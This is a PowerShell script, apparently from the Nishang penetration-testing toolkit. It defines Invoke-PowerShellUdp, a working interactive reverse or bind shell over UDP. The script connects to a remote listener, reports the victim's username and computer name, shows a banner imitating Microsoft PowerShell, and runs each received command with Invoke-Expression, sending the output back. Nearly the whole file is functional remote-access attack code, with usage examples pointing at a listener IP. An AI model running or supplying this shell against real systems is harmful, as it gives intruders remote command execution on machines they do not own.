function Invoke-PowerShellUdp
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target over UDP. 

.DESCRIPTION
This script is able to connect to a standard netcat listening on a UDP port when using the -Reverse switch. 
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellUdp -Reverse -IPAddress 192.168.254.226 -Port 53

Above shows an example of an interactive PowerShell reverse connect shell. 

.EXAMPLE
PS > Invoke-PowerShellUdp -Bind -Port 161

Above shows an example of an interactive PowerShell bind connect shell. 

.EXAMPLE
PS > Invoke-PowerShellUdp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 53

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-2.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>         
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $IPv6,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

        
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPAddress),$Port)

            # Regex from http://stackoverflow.com/questions/53497/regular-expression-that-matches-valid-ipv6-addresses
            if ($IPAddress -match "(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))")
            {
                $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetworkV6)
            }
            else
            {
                $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetwork)
            }
        }

        #Bind to the provided port if Bind switch is used.
       if ($Bind)
        {
            $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::ANY,$Port)
        
            if ($IPv6)
            {
                $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetworkV6)
            }
            else
            {
                $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetwork)
            }
        
            $client.Receive([ref]$endpoint)
        }

        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $client.Send($sendbytes,$sendbytes.Length,$endpoint)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
        $client.Send($sendbytes,$sendbytes.Length,$endpoint)
    
        while($true)
        {
            $receivebytes = $client.Receive([ref]$endpoint)
            $returndata = ([text.encoding]::ASCII).GetString($receivebytes)
            
            try
            {
                #Execute the command on the target.
                $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }

            $sendback = $result +  'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback + $x

            #Send results back
            $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2)
            $client.Send($sendbytes,$sendbytes.Length,$endpoint)
        }
        $client.Close()
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

